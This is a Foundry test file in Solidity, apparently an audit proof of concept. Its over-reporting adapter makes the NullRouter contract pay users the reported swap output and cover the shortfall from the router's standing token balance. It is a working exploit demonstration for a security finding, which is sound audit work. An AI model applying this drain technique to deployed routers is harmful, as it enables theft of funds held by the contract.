// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.24;

import {Test} from "forge-std/Test.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {NullRouter} from "../src/NullRouter.sol";
import {INullRouter} from "../src/interfaces/INullRouter.sol";

contract MockERC20 {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 a) external { balanceOf[to] += a; }
    function approve(address s, uint256 a) external returns (bool) { allowance[msg.sender][s] = a; return true; }
    function transfer(address to, uint256 a) external returns (bool) { _x(msg.sender, to, a); return true; }
    function transferFrom(address f, address to, uint256 a) external returns (bool) {
        uint256 al = allowance[f][msg.sender];
        if (al != type(uint256).max) { require(al >= a, "ALLOWANCE"); allowance[f][msg.sender] = al - a; }
        _x(f, to, a); return true;
    }
    function _x(address f, address to, uint256 a) internal { require(balanceOf[f] >= a, "BAL"); balanceOf[f] -= a; balanceOf[to] += a; }
}

contract MockRegistry {
    function isApproved(address) external pure returns (bool) { return true; }
}

contract MockFeeCollector {
    function feeBpsFor(address) external pure returns (uint16) { return 0; }
    function collectFee(address, uint256, address) external {}
}

/// Adapter that DELIVERS less than it REPORTS — models a fee-on-transfer output token
/// (transfer tax burns part of the delivery) or an over-reporting/buggy whitelisted adapter.
contract OverReportingAdapter {
    uint256 public shortfall;
    constructor(uint256 s) { shortfall = s; }
    function swap(address, address tokenOut, uint256 amountIn, address to, bytes calldata) external returns (uint256) {
        MockERC20(tokenOut).mint(to, amountIn - shortfall); // delivers less...
        return amountIn;                                    // ...but reports the full amount
    }
}

/// PoC: the H1 dust-baseline guard stops a swapper from SWEEPING the router's standing
/// balance, but _settleOutput still SPENDS it. Because the fee and the user payout are
/// computed from the adapter's self-reported return rather than a measured balance delta,
/// a shortfall is silently covered out of whatever the router already holds.
contract AuditPoCTest is Test {
    NullRouter router;
    MockERC20 tA;
    MockERC20 tB;
    address user = address(0xBEEF);
    address adapter;
    uint256 constant AMT = 100 ether;
    uint256 constant SHORTFALL = 10 ether;
    uint256 constant DONATION = 50 ether;

    function setUp() public {
        tA = new MockERC20();
        tB = new MockERC20();
        MockFeeCollector fc = new MockFeeCollector();
        MockRegistry reg = new MockRegistry();
        adapter = address(new OverReportingAdapter(SHORTFALL));

        NullRouter impl = new NullRouter();
        router = NullRouter(payable(address(new ERC1967Proxy(
            address(impl),
            abi.encodeCall(NullRouter.initialize, (address(this), address(0x1234), address(0), address(fc), address(reg)))
        ))));

        tA.mint(user, 1_000 ether);
        vm.prank(user);
        tA.approve(address(router), type(uint256).max);
    }

    function test_poc_standingBalanceSubsidisesOutputShortfall() public {
        // Someone donated (or a prior swap over-delivered) tokenOut into the router.
        tB.mint(address(router), DONATION);
        assertEq(tB.balanceOf(address(router)), DONATION, "setup");

        INullRouter.RouteStep memory r = INullRouter.RouteStep({
            adapter: adapter, tokenIn: address(tA), tokenOut: address(tB), amountIn: AMT, extraData: ""
        });

        vm.prank(user);
        uint256 got = router.swap(address(tA), address(tB), AMT, 0, block.timestamp + 1, r, address(0));

        // The user is paid the REPORTED amount, not the DELIVERED amount.
        assertEq(got, AMT, "user paid the reported amount");
        assertEq(tB.balanceOf(user), AMT, "user received more than the swap produced");

        // The extra came straight out of the router's pre-existing balance.
        assertEq(tB.balanceOf(address(router)), DONATION - SHORTFALL, "standing balance was spent");
    }
}
